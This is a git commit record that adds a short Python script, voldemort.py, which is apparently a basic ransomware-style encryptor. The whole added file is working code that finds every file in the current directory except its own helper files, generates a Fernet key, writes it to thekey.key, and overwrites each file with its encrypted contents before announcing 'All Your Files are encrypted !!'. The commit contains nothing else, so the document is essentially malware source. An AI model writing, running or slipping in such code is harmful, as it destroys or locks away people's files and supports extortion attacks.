e5b9c363a391972e0413523d065edf68a1c1ef67
Roshan Biju <roshanrainbow@gmail.com>
2022-07-16 17:36:22 +0530

    commit 9

---
+++ voldemort.py
@@ -0,0 +1,25 @@
+#Finding the files
+import os
+from cryptography.fernet import Fernet
+
+files =[]
+for file in os.listdir():
+        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" or file == "a1" or file == "d1" or file == "r1":
+                continue
+        if os.path.isfile(file):    
+                 files.append(file)   
+print(files)   
+
+key = Fernet.generate_key()
+with open ("thekey.key", "wb") as thekey:
+         thekey.write(key)
+
+for file in files:
+        with open(file, "rb") as thefile:
+                 contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open (file, "wb") as thefile:
+                thefile.write(contents_encrypted)  
+
+
+print("All Your Files are encrypted !!")                        
